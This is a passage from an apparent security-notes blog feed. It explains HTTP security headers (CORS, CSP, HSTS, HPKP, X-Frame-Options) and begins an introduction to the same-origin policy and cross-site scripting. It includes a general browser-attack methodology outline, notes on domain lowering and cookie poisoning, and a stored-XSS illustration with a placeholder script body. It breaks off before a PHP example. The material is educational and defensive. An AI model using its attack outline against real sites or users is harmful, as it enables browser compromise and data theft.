User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://foo.example/examples/access-control/simpleXSInvocation.html
Origin: http://foo.example


HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 00:23:53 GMT
Server: Apache/2.0.61
Access-Control-Allow-Origin: *
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/xml

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To note:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Origin&lt;/strong&gt; header in the request from &lt;em&gt;foo.example&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;*Access-Control-Allow-Origin: **&lt;/em&gt; header in the response from &lt;em&gt;bar.other&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;summary&quot;&gt;Summary&lt;/h3&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;Origin&lt;/code&gt; header clearly shows by whom the invocation has been done.&lt;/p&gt;

&lt;p&gt;The domain &lt;em&gt;bar.others&lt;/em&gt; answering with&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin: *&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;has allowed &lt;strong&gt;anyone&lt;/strong&gt; to include his content through cross-origin requests. If it would have restricted access only to &lt;em&gt;foo.example&lt;/em&gt; then it would have sent back&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin: http://foo.example&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;For more in depth and other cases than this “simple request”:
&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;csp-or-content-security-policy&quot;&gt;CSP or &lt;em&gt;Content Security Policy&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Its aim is to mitigate XSS and data injection attacks by differentiating &lt;strong&gt;instructions&lt;/strong&gt; and &lt;strong&gt;content&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Security-Policy: &amp;lt;policy&amp;gt; &lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Content-Security-Policy: &amp;lt;policy&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;are sent by server to stipulate locations where scripts can be loaded. It also stipulate restrictions on which JavaScript function is allowed to use or not.&lt;/p&gt;

&lt;p&gt;Alternatively, the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; element can be used to configure a policy, for example:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src 'none';&quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;CSP permits to specify domains that browser should consider to be valid sources of executable scripts.
CSP can specify also the protocol to use like the encrypted HTTPS.&lt;/p&gt;

&lt;h3 id=&quot;policies&quot;&gt;Policies&lt;/h3&gt;
&lt;p&gt;Are directives each of which describes the policy for a certain resource type or area.&lt;/p&gt;

&lt;p&gt;A policy needs to include a &lt;strong&gt;default-src&lt;/strong&gt; or &lt;strong&gt;script-src&lt;/strong&gt; directive to prevent inline scripts from running, as well as blocking the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;eval()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;A policy needs to include a &lt;strong&gt;default-src&lt;/strong&gt; or &lt;strong&gt;style-src&lt;/strong&gt; directive to restrict inline styles from being applied from a &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;style&amp;gt;&lt;/code&gt; element or a style attribute.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Security-Policy: &lt;/code&gt; [directive] [source-expression]&lt;/p&gt;

&lt;p&gt;Examples&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Security-Policy: default-src 'self'&lt;/code&gt; : All content must come from site’s own origin.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Security-Policy: default-src 'self' *.trusted.com
&lt;/code&gt; : allow a trusted domain and its subdomains.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com&lt;/code&gt; : images can be included from any domain but media (audio/video) is restricted. All scripts must come from that domain.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Security-Policy: default-src https://onlinebanking.jumbobank.com&lt;/code&gt;: if you want &lt;strong&gt;all&lt;/strong&gt; content to be loaded under SSL/TLS just set the default-src domain under HTTPS.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Security-Policy: default-src 'self' *.mailsite.com; img-src *&lt;/code&gt;: allow html and images but not Javascript. The tag &lt;code class=&quot;highlighter-rouge&quot;&gt;script-src&lt;/code&gt; is not specified, so the default setting will follow &lt;code class=&quot;highlighter-rouge&quot;&gt;default-src&lt;/code&gt; or “all must be loaded from the originating server”.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Other directives:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;connect‑src&lt;/li&gt;
  &lt;li&gt;font‑src&lt;/li&gt;
  &lt;li&gt;frame‑src&lt;/li&gt;
  &lt;li&gt;img‑src&lt;/li&gt;
  &lt;li&gt;media‑src&lt;/li&gt;
  &lt;li&gt;object‑src&lt;/li&gt;
  &lt;li&gt;script‑src&lt;/li&gt;
  &lt;li&gt;style‑src&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Source expressions:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;‘&lt;strong&gt;none&lt;/strong&gt;’ : Allows no resources.&lt;/li&gt;
  &lt;li&gt;‘&lt;strong&gt;self&lt;/strong&gt;’: Allows resources from the host that served the page.&lt;/li&gt;
  &lt;li&gt;‘&lt;strong&gt;unsafe‑inline&lt;/strong&gt;’: Allows resources embedded in the page, such as inline &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; elements, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;style&amp;gt;&lt;/code&gt; elements, and javascript: URLs&lt;/li&gt;
  &lt;li&gt;‘&lt;strong&gt;unsafe‑eval&lt;/strong&gt;’: Allows the use of the JavaScript eval function.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Further docs in ref: &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;x-content-type-options&quot;&gt;X-Content-Type-Options&lt;/h2&gt;
&lt;p&gt;This header is used by the server to indicate that the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types&quot;&gt;MIME types&lt;/a&gt; written in the &lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; header &lt;strong&gt;should not&lt;/strong&gt; be changed and &lt;strong&gt;be followed&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Content-Type-Options: nosniff&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;When a &lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; is not specified, the browser take a guess on what type of content it has received. The directive &lt;code class=&quot;highlighter-rouge&quot;&gt;nosniff&lt;/code&gt; just disable this behaviour.&lt;/p&gt;

&lt;p&gt;Example:
if the server sends a &lt;code class=&quot;highlighter-rouge&quot;&gt;nosniff&lt;/code&gt; directive in response to a &lt;code class=&quot;highlighter-rouge&quot;&gt;script&lt;/code&gt; tag, then the browser will ignore the response unless the MIME type matches &lt;code class=&quot;highlighter-rouge&quot;&gt;application/javascript&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;x-frame-options&quot;&gt;X-Frame-Options&lt;/h2&gt;
&lt;p&gt;indicate if a browser should be allowed to render a page in an &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;frame&amp;gt;&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;object&amp;gt;&lt;/code&gt;. This in order to avoid &lt;a href=&quot;https://en.wikipedia.org/wiki/Clickjacking&quot;&gt;clickjacking attacks&lt;/a&gt; (also known as “User Interface redress attack, UI redress attack,”).&lt;/p&gt;

&lt;p&gt;Possible directives:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://example.com/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;DENY&lt;/strong&gt; : attempts to load page in a frame will fail also whed the page is loaded from the same site.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SAMEORIGIN&lt;/strong&gt;: only allow page from the same origin to be loaded into the page itself.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ALLOW-FROM uri&lt;/strong&gt;: the page can only be displayed in a frame on the specified origin.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: SAMEORIGIN and ALLOW-FROM doesn’t check if also their ancestors are in the same origin.&lt;/p&gt;

&lt;h2 id=&quot;hsts-http-strict-transport-security&quot;&gt;HSTS &lt;em&gt;HTTP Strict Transport Security&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;protect websites against protocol &lt;strong&gt;downgrade attacks&lt;/strong&gt; and &lt;strong&gt;cookie hijacking&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;It tells the browser to only access the domain using secure HTTPS connections and never via HTTP. Note that the there will always be the firstconnection to a server on a standard unsecure port.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Strict-Transport-Security: max-age=31536000 ; includeSubDomains; preload&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;hpkp-public-key-pinning-extension&quot;&gt;HPKP &lt;em&gt;Public Key Pinning Extension&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;is a security mechanism which allow HTTPS websites to resist impersonation by attackers using mis-issued or fraudolent certificates.&lt;/p&gt;

&lt;p&gt;The HTTPS web server serves a list of public key hashes and on subsequent connections clients expect the the server use one of those in the certificate chain. Its use must be wisely adopted because could easily make websites unavailable.&lt;/p&gt;

&lt;p&gt;Example&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Public-Key-Pins: pin-sha256=&quot;d6qzRu9zOECb90Uez27xWltNsj0e1Md7GkYYkVoZWmM=&quot;; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;; report-uri=&quot;http://example.com/pkp-report&quot;; max-age=10000; includeSubDomains&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;pin-sha256=”&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;sha256&amp;gt;&lt;/code&gt;“&lt;/strong&gt;: base64 encoded Subject Public Key Information fingerprint.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;max-age=SECONDS&lt;/strong&gt;: time that the browser should remember the rule.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;includeSubDomains&lt;/strong&gt;: (optional) apply to all subdomains.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;report-uri=”&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;URL&amp;gt;&lt;/code&gt;“&lt;/strong&gt;: (optional) pin validation failures will be reported to the given URL.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;x-xss-protection&quot;&gt;X-XSS-Protection&lt;/h2&gt;
&lt;p&gt;This header enables the Cross-site scripting (XSS) filter in your browser.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;X-XSS-Protection: 1; mode=block&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;0&lt;/strong&gt; : filter disabled&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;1&lt;/strong&gt; : filter enabled, browser will sanitize tha page&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;mode=block&lt;/strong&gt;: rather than sanitize the browser will block the render of the page&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;report=”&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;url&amp;gt;&lt;/code&gt;”“&lt;/strong&gt;: sanitize + report violation&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;Other header examples are&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Referrer-Policy: no-referrer&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Expect-CT: max-age=86400, enforce, report-uri=&amp;lt;url&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Permitted-Cross-Domain-Policies: none&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Thu, 26 Apr 2018 00:00:00 +0200</pubDate>
        <link>https://carloalbertoscola.it//2018/notes/http-header-security/</link>
        <guid isPermaLink="true">https://carloalbertoscola.it//2018/notes/http-header-security/</guid>
        
        
        <category>notes</category>
        
      </item>
    
      <item>
        <title>SOP and XSS introduction</title>
        <description>&lt;h1 id=&quot;same-origin-policy-and-cross-site-scripting-introduction&quot;&gt;Same Origin Policy and Cross-Site-Scripting introduction&lt;/h1&gt;
&lt;h2 id=&quot;what-is-an-xss-attack&quot;&gt;What is an XSS Attack?&lt;/h2&gt;
&lt;p&gt;XSS attacks exploit the browser’s trust of the content received from the server. Malicious scripts are executed by the victim’s browser because the browser trusts the source of the content, even when it’s not coming from where it seems to be coming from.&lt;/p&gt;

&lt;h2 id=&quot;what-is-covered-here&quot;&gt;What is covered here:&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#1-name-convenction&quot;&gt;Name convenction&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-basic-browser-capabilities-and-vulnerability&quot;&gt;Basic Browser capabilities and vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-attack-methodology-in-short-&quot;&gt;Attack methodology&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-useful-http-headers&quot;&gt;Useful HTTP headers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-same-origin-policy&quot;&gt;Same-Origin-Policy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#6-cross-site-scripting&quot;&gt;Cross-Site-Scripting&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#7-xss-examples&quot;&gt;XSS examples and testing&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#8-url-obfuscation&quot;&gt;Obfuscation and encoding&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#9-owasp-xss-prevention-rules&quot;&gt;OWASP Prevention&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;1-name-convenction&quot;&gt;1. Name convenction&lt;/h2&gt;

&lt;p&gt;Some basic names to know:&lt;/p&gt;

&lt;h3 id=&quot;dom-or-document-object-model&quot;&gt;DOM or &lt;em&gt;Document Object Model&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;is the main model by which scripting languages like Javascript handle and modify the html or xml page. It is divided hierarchically with the root level being the &lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;/code&gt; tag.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;It is an API for interacting with objects within HTML or XML documents.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://bestrockers.ddns.net/res/dom.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;rendering-engines&quot;&gt;Rendering Engines&lt;/h3&gt;
&lt;p&gt;which includes &lt;em&gt;layout engines&lt;/em&gt; and &lt;em&gt;web browser engines&lt;/em&gt;.
 They convert data into a format useful for presentation to the user on the screen, they combine HTML with CSS and images.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Webkit –&amp;gt; Google Chrome&lt;/li&gt;
  &lt;li&gt;Trident –&amp;gt; Microsoft&lt;/li&gt;
  &lt;li&gt;Gecko –&amp;gt; Firefox&lt;/li&gt;
  &lt;li&gt;Presto –&amp;gt; Opera&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;#### Web Sockets
 Browser method to open responsive, full duplex communication with a server. It is a replacement for AJAX technologies, and it is native in browsers.&lt;/p&gt;

&lt;p&gt;To see if a browser support websockets:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;return !!window.WebSocket || !!window.MozWebSocket;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Ref -&amp;gt; &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;web-workers-or-browser-threads&quot;&gt;Web Workers or “browser threads”&lt;/h3&gt;
&lt;p&gt;Given that Javascript run single threaded there are ways to achieve cuncurrency:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;setTimeout(func, timeout);&lt;/li&gt;
  &lt;li&gt;setInterval(func, timeout);&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Browser threads run in background and there are two types:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;shared across anything under the same origin&lt;/li&gt;
  &lt;li&gt;that communicate only back to its creator&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;2-basic-browser-capabilities-and-vulnerability&quot;&gt;2. Basic Browser capabilities and vulnerability&lt;/h2&gt;
&lt;h3 id=&quot;sandboxing&quot;&gt;Sandboxing&lt;/h3&gt;
&lt;p&gt;The base assumption is that the browser in a way or another &lt;strong&gt;will be compromised&lt;/strong&gt;. The sandbox is a mitigating control which can be applied at:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;kernel level&lt;/em&gt;: to separate one user from another&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;hardware level&lt;/em&gt;: to separate privileges between kernel/user space&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;browser level&lt;/em&gt;: (highest level) it is the barrier between privileges given to browser by OS and privileges of a subprocess running in the broser.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To compromise the browser you need two steps:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;find vuln in the browser&lt;/strong&gt; –&amp;gt; &lt;strong&gt;break through the sandbox&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;extensions-and-plugins&quot;&gt;Extensions and Plugins&lt;/h3&gt;
&lt;p&gt;augment browser capabilities but increase the &lt;strong&gt;attack surface&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Plugins differs from extensions in the fact that they need &lt;strong&gt;to be included in the page&lt;/strong&gt; with an object tag or content-type-header.&lt;/p&gt;

&lt;h3 id=&quot;javascript-xmlhttprequest&quot;&gt;Javascript: &lt;em&gt;XMLHttpRequest()&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;Use XMLHttpRequest (XHR) objects to interact with servers, retrieve data from a URL. Heavily used in Ajax. It supports other protocol than HTTP like &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Easy example:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-JavaScript&quot;&gt; function reqListener () {
   console.log(this.responseText);
 }

 var oReq = new XMLHttpRequest();
 oReq.onload = reqListener;
 oReq.open(&quot;GET&quot;, &quot;http://www.example.org/example.txt&quot;);
 oReq.send();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ref:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/it/docs/Web/API/XMLHttpRequest/Usare_XMLHttpRequest&quot;&gt;https://developer.mozilla.org/it/docs/Web/API/XMLHttpRequest/Usare_XMLHttpRequest&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;3-attack-methodology-in-short&quot;&gt;3. Attack methodology (in short)&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://bestrockers.ddns.net/res/att-met.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Initiating&lt;/strong&gt;: execute instructions on browser victim&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Retaining&lt;/strong&gt;: you need to maintain control over time, the code need to continuously ask for your next wishes&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Attacking&lt;/strong&gt;: you leverage control over the browser.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bypass the SOP&lt;/strong&gt;: SOP is the primary sandbox. If you are able to bypass you have automatically created a succesfull attack, you can include resources from another origin.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Attacking users&lt;/strong&gt;: you can encourage users to enter compromising information by altering the page or granting privileges for arbitrary program or local resources.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Attacking browser&lt;/strong&gt;: you attack browser API and abstractions to store and recall data.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Attacking extensions&lt;/strong&gt;: exploiting extension could allow you to run OS commands or cross origin requests.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Attacking Plugins&lt;/strong&gt;: one of the most vulnerable area of the browser.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Attacking web application&lt;/strong&gt;:&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Attacking networks&lt;/strong&gt;: connect to non standard ports&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;4-useful-http-headers&quot;&gt;4. Useful HTTP Headers&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;/notes/2018/04/26/http-header-security.html&quot;&gt;Link here&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;5-same-origin-policy&quot;&gt;5. Same-Origin-Policy&lt;/h2&gt;

&lt;p&gt;Fast example of how SOP block resource access.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://bestrockers.ddns.net/res/sop.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;test1.com&lt;/em&gt; can’t access data of &lt;em&gt;bankofamerica.com&lt;/em&gt; in the same browser.&lt;/p&gt;

&lt;p&gt;GET/POST requests can be made from one domain to *****. (all domain)&lt;/p&gt;

&lt;p&gt;GET/POST response can be read only if:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ports match&lt;/li&gt;
  &lt;li&gt;domain/subdomain match&lt;/li&gt;
  &lt;li&gt;protocol match&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;on &lt;strong&gt;both sites&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;exception&quot;&gt;Exception&lt;/h4&gt;

&lt;p&gt;Two subdomain (different origin) under the same domain.&lt;/p&gt;

&lt;p&gt;Ex: &lt;em&gt;siteA.live.com&lt;/em&gt; and &lt;em&gt;vulnerable.live.com&lt;/em&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;em&gt;siteA.live.com&lt;/em&gt; sets &lt;code class=&quot;highlighter-rouge&quot;&gt;document.domain = live.com&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;vulnerable.live.com&lt;/em&gt; can set domain to “live.com” and access data of &lt;em&gt;siteA.live.com&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Cross Sub-Domain communication&lt;/strong&gt;  or &lt;strong&gt;Domain Lowering&lt;/strong&gt; or &lt;strong&gt;Putting all the eggs in one basket&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;same-origin-for-cookies&quot;&gt;Same origin for COOKIES&lt;/h3&gt;

&lt;p&gt;By default cookies permit read/write access if the domain is the same but:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;No port number check&lt;/li&gt;
  &lt;li&gt;No scheme check&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;vuln.live.com&lt;/em&gt; can poison cookies of &lt;em&gt;live.com&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;vuln.live.com:1111&lt;/em&gt; can poison cookies of &lt;em&gt;live.com:2222&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;So? Ports are not a security boundary. Different web app on different port should be avoided.&lt;/p&gt;

&lt;p&gt;Need &lt;strong&gt;cross domain&lt;/strong&gt; requests? use &lt;strong&gt;CORS&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Cross-domain GET/POST can easily introduce &lt;strong&gt;CSRF&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;6-cross-site-scripting&quot;&gt;6. Cross-Site-Scripting&lt;/h2&gt;

&lt;h3 id=&quot;how-is-the-malicius-js-injected&quot;&gt;How is the malicius js injected?&lt;/h3&gt;
&lt;p&gt;The attacker inject the code into the pages that victim downloads from the website. Example if the &lt;strong&gt;user input is directly included&lt;/strong&gt; in the output.&lt;/p&gt;

&lt;p&gt;Example: (SSI)&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;print &quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&quot;
print &quot;Latest comment:&quot;
print database.latestComment
print &quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;If user supply “&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&lt;/code&gt;” as a comment (under a post i.e) the output will be:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
Latest comment:
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;and will be executed in the browser victim.&lt;/p&gt;

&lt;p&gt;This is what is called &lt;strong&gt;Persistent XSS&lt;/strong&gt; or &lt;strong&gt;Stored XSS&lt;/strong&gt; because an attacker has been able to inject some code directly into the data storage of the application (database). This results in serving the code to whoever is watching the page without further actions by the attacker.&lt;/p&gt;

&lt;p&gt;Let’s see another example.&lt;/p&gt;

&lt;p&gt;This is a server side PHP script&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
